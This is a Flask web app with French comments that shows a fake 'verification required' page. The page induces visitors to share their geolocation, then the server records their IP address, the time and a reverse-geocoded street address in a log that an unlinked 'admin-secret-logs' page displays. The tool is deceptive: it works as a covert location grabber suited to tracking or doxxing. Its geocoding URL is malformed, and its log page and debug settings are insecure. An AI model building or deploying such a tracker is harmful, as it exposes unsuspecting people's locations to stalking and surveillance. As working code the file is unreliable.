from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import requests
import os

app = Flask(__name__)

# Nom du fichier où seront stockées toutes les géolocalisations
FICHIER_LOGS = "geoloc_utilisateurs.txt"

HTML_VALIDATION = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification requise</title>
    <style>
        body { 
            margin: 0; 
            background-color: #2b2b2b; 
            color: #ffffff; 
            font-family: Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            text-align: center;
        }
        .box { 
            background-color: #3a3a3a; 
            padding: 30px; 
            border-radius: 8px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 90%;
        }
        h2 { margin-top: 0; font-size: 22px; }
        p { color: #cccccc; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
        button { 
            background-color: #007bff; 
            color: white; 
            border: none; 
            padding: 12px 24px; 
            font-size: 15px; 
            font-weight: bold; 
            border-radius: 4px; 
            cursor: pointer; 
            width: 100%;
        }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>

    <div class="box">
        <h2>Vérification requise</h2>
        <p>Avant de continuer et d'accéder au site, veuillez valider votre géolocalisation (vous pouvez accepter ou refuser la demande du navigateur).</p>
        <button onclick="declencherVerification()">Continuer</button>
    </div>

    <script>
    function declencherVerification() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    envoyerDonnees(position.coords.latitude, position.coords.longitude);
                },
                (error) => {
                    envoyerDonnees(null, null);
                }
            );
        } else {
            envoyerDonnees(null, null);
        }
    }

    function envoyerDonnees(lat, lon) {
        fetch('/api/verification', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude: lat, longitude: lon })
        })
        .then(res => res.json())
        .then(data => {
            window.location.href = "/site";
        });
    }
    </script>
</body>
</html>
"""

@app.route('/')
def page_verification():
    return render_template_string(HTML_VALIDATION)

@app.route('/api/verification', methods=['POST'])
def api_verification():
    data = request.json
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    
    # Détection de la vraie adresse IP publique
    if request.headers.getlist("X-Forwarded-For"):
        ip_visiteur = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    else:
        ip_visiteur = request.remote_addr
        
    heure_exacte = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    rue_exacte = "Inconnu (Géolocalisation refusée par l'utilisateur)"
    if latitude and longitude:
        try:
            url_osm = f"https://openstreetmap.org{latitude}&lon={longitude}"
            reponse = requests.get(url_osm, headers={'User-Agent': 'VerifSimpleServer'}).json()
            if 'address' in reponse:
                num = reponse['address'].get('house_number', '')
                route = reponse['address'].get('road', 'Rue inconnue')
                ville = reponse['address'].get('city', reponse['address'].get('town', 'Ville inconnue'))
                pays = reponse['address'].get('country', 'Pays inconnu')
                rue_exacte = f"{num} {route}, {ville}, {pays}"
        except Exception:
            rue_exacte = "Erreur lors de la récupération de la rue"

    # CRÉATION DU BLOC DE TEXTE
    bloc_texte = (
        f"====================================================\n"
        f"⏰ Heure exacte : {heure_exacte}\n"
        f"🌐 Adresse IP   : {ip_visiteur}\n"
        f"🏠 Localisation : {rue_exacte}\n"
        f"====================================================\n\n"
    )

    # ENREGISTREMENT DANS LE FICHIER TEXTE (S'ajoute à la suite sans rien effacer)
    with open(FICHIER_LOGS, "a", encoding="utf-8") as f:
        f.write(bloc_texte)

    return jsonify({"status": "ok"})

# PAGE SPÉCIALE ADMIN POUR LIRE LE FICHIER TEXTE DEPUIS TON NAVIGATEUR
@app.route('/admin-secret-logs')
def afficher_les_logs():
    if os.path.exists(FICHIER_LOGS):
        with open(FICHIER_LOGS, "r", encoding="utf-8") as f:
            contenu = f.read()
        # Affiche le fichier texte proprement sur fond noir
        return f"<pre style='background-color:#111; color:#00ff00; padding:20px; font-family:monospace;'>{contenu}</pre>"
    else:
        return "<body style='background-color:#111; color:white; padding:20px;'><h3>Aucune connexion enregistrée pour le moment.</h3></body>"

@app.route('/site')
def page_site_vide():
    return "<body style='background-color:#121212; color:white; font-family:Arial; padding:50px;'><h1>Bienvenue sur le site</h1><p>Le site est actuellement vide, mais vous y avez accédé avec succès après l'étape de vérification.</p></body>"

if __name__ == '__main__':
    port_web = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host='0.0.0.0', port=port_web)


